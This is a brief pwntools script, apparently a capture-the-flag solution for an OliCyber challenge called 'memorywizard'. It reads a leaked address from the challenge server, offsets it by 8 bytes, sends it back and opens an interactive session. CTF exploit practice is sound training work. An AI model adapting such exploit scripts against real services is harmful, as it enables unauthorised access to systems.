from pwn import *

r = remote("memorywizard.challs.olicyber.it", 21001)

r.recvline()
ret_addr = r.recvline().decode().split("to ")[1].replace('"', "").strip()
r.recv(1000)

flag = int(ret_addr, 16) + 0x08

r.sendline(hex(flag).encode())

r.interactive()